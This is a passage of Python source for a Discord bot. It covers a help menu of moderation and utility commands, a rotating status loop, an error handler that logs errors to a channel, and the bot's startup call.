	)
	response = completion.choices[0].text
	embed = discord.Embed(title="Chat-GPT", description = f'Request: {prompt} ', color=discord.Color.blue())
	embed.add_field(name = 'Result:', value = f'`{response}`', inline = False)
	await ctx.respond(embed=embed)

#chat-gpt end


#applicationcommand end


@client.command()
@commands.guild_only()
async def help(ctx):
	prefix = data["command_prefix"]
	embed = discord.Embed(title="Mod Commands :closed_lock_with_key:", color=discord.Color.gold())
	embed.add_field(name=f"{prefix}nuke", value=f"Delete messages in the chat where it is used", inline=True)
	embed.add_field(name=f"{prefix}kick user_id reason", value=f"Kick a member from the server", inline=True)
	embed.add_field(name=f"{prefix}ban user_id reason", value=f"Ban a member from the server", inline=True)
	embed.add_field(name=f"{prefix}unban user_id", value=f"Unban a member from the server", inline=True)
	embed.add_field(name=f"{prefix}delchannel", value=f"Delete all channel", inline=True)
	embed.add_field(name=f"{prefix}lockdown", value=f"Lockdown all channel", inline=True)
	embed.add_field(name=f"{prefix}unlock", value=f"Unlock channel", inline=True)
	embed.add_field(name=f"{prefix}mute", value=f"Mute a member", inline=True)
	embed.add_field(name=f"{prefix}unmute", value=f"Unmute a member", inline=True)
	embed.set_footer(text=footer_testo)  
	await ctx.send(embed=embed)
	await asyncio.sleep(1*1)
	embedt = discord.Embed(title="Utilty :chart_with_downwards_trend:", color=discord.Color.green())
	embedt.add_field(name=f"{prefix}casual", value="Extracts Yes or No", inline=True)
	embedt.add_field(name=f"{prefix}coinflip", value="Extracts heads or tails", inline=True)
	embedt.add_field(name=f"{prefix}num_extractor", value="Extracts a number from 1 to 10", inline=True)
	embedt.add_field(name=f"{prefix}activity", value="Send the No-Nitro and the Nitro Activity", inline=True)
	embedt.add_field(name=f"{prefix}infobot", value="Send the bot stats (cpu, memory, ping)", inline=True)
	embedt.add_field(name=f"{prefix}meme", value="Send a random meme", inline=True)
	embedt.set_footer(text=footer_testo)
	await ctx.send(embed=embedt)
	await asyncio.sleep(1*1)
	embedd = discord.Embed(title="Info Server/user Commands :scroll:", color=discord.Color.blurple())
	embedd.add_field(name=f"{prefix}serverinfo", value="Send the server info", inline=True)
	embedd.add_field(name=f"{prefix}user user_id", value="Send the User info", inline=True)
	embedd.set_footer(text=footer_testo)
	await ctx.send(embed=embedd)



@tasks.loop(seconds=18)
async def change_status():
	stbot1 = data["status-1"]
	stbot2 = data["status-2"]
	#statuses = [f"{stbot1}",f"{stbot2}"]
	#status = random.choice(statuses)
	await client.change_presence(status=discord.Status.online, activity=discord.Activity(type=discord.ActivityType.watching, name=stbot1))
	await asyncio.sleep(6)
	await client.change_presence(status=discord.Status.online, activity=discord.Activity(type=discord.ActivityType.watching, name=stbot2))
	await asyncio.sleep(6)
	await client.change_presence(status=discord.Status.online, activity=discord.Activity(type=discord.ActivityType.watching, name=f"{len(client.guilds)} server"))


@client.event
async def on_command_error(ctx, error):
    if isinstance(error, discord.ext.commands.errors.CommandNotFound):
        embed = discord.Embed(title="Error: This command does not exist", color=discord.Color.red())
        embed.set_footer(text=footer_testo)
        await ctx.send(embed=embed, delete_after=4)
		#error-chat
        channel = client.get_channel(errorchannel)
        embed = discord.Embed(title=f"**[Errore]** \nisinstance: ```{isinstance}```\nerror: ```{str(error)}```", color=discord.Color.red())
        await channel.send(embed=embed)
    elif isinstance(error, discord.ext.commands.errors.CommandInvokeError):
        embed = discord.Embed(title=f"Error: Unknown", color=discord.Color.red())
        embed.set_footer(text=footer_testo)
        await ctx.send(embed=embed, delete_after=4)
		#error-chat
        channel = client.get_channel(errorchannel)
        embed = discord.Embed(title=f"**[Errore]** \nisinstance: ```{isinstance}```\nerror: ```{str(error)}```", color=discord.Color.red())
        await channel.send(embed=embed)
        raise error
    elif isinstance(error, discord.ext.commands.errors.MissingPermissions):
        embed = discord.Embed(title="Error: You need the permission to use this command", color=discord.Color.red())
        embed.set_footer(text=footer_testo)
        await ctx.send(embed=embed, delete_after=4)
		#error-chat
        channel = client.get_channel(errorchannel)
        embed = discord.Embed(title=f"**[Errore]** \nisinstance: ```{isinstance}```\nerror: ```{str(error)}```", color=discord.Color.red())
        await channel.send(embed=embed)
    elif isinstance(error, discord.ext.commands.errors.MemberNotFound):
        embed = discord.Embed(title="Error: Member not found", color=discord.Color.red())
        embed.set_footer(text=footer_testo)
        await ctx.send(embed=embed, delete_after=4)
		#error-chat
        channel = client.get_channel(errorchannel)
        embed = discord.Embed(title=f"**[Errore]** \nisinstance: ```{isinstance}```\nerror: ```{str(error)}```", color=discord.Color.red())
        await channel.send(embed=embed)
    elif isinstance(error, discord.ext.commands.errors.UserNotFound):
        embed = discord.Embed(title="Error: User not found", color=discord.Color.red())
        embed.set_footer(text=footer_testo)
        await ctx.send(embed=embed, delete_after=4)
		#error-chat
        channel = client.get_channel(errorchannel)
        embed = discord.Embed(title=f"**[Errore]** \nisinstance: ```{isinstance}```\nerror: ```{str(error)}```", color=discord.Color.red())
        await channel.send(embed=embed)
    elif isinstance(error, discord.ext.commands.errors.MissingRequiredArgument):
        embed = discord.Embed(title="Error: Missing required argument", color=discord.Color.red())
        embed.set_footer(text=footer_testo)
        await ctx.send(embed=embed, delete_after=4)
		#error-chat
        channel = client.get_channel(errorchannel)
        embed = discord.Embed(title=f"**[Errore]** \nisinstance: ```{isinstance}```\nerror: ```{str(error)}```", color=discord.Color.red())
        await channel.send(embed=embed)
    elif isinstance(error, discord.ext.commands.errors.NoPrivateMessage):
        embed = discord.Embed(title="Error: This command can only be used in servers", color=discord.Color.red())
        embed.set_footer(text=footer_testo)
        await ctx.send(embed=embed, delete_after=4)
		#error-chat
        channel = client.get_channel(errorchannel)
        embed = discord.Embed(title=f"**[Errore]** \nisinstance: ```{isinstance}```\nerror: ```{str(error)}```", color=discord.Color.red())
        await channel.send(embed=embed)
    elif isinstance(error, discord.errors.HTTPException):
        embed = discord.Embed(title="Error", color=discord.Color.red())
        embed.set_footer(text=footer_testo)
        await ctx.send(embed=embed, delete_after=4)
		#error-chat
        channel = client.get_channel(errorchannel)
        embed = discord.Embed(title=f"**[Errore]** \nisinstance: ```{isinstance}```\nerror: ```{str(error)}```", color=discord.Color.red())
        await channel.send(embed=embed)
    else:
        embed = discord.Embed(title="Error: Unknown", color=discord.Color.red())
        embed.set_footer(text=footer_testo)
        await ctx.send(embed=embed, delete_after=4)
		#error-chat
        channel = client.get_channel(errorchannel)
        embed = discord.Embed(title=f"**[Errore]** \nisinstance: ```{isinstance}```\nerror: ```{str(error)}```", color=discord.Color.red())
        await channel.send(embed=embed)
        raise error
        




token_json = data["discord_token"]
client.run(token_json)
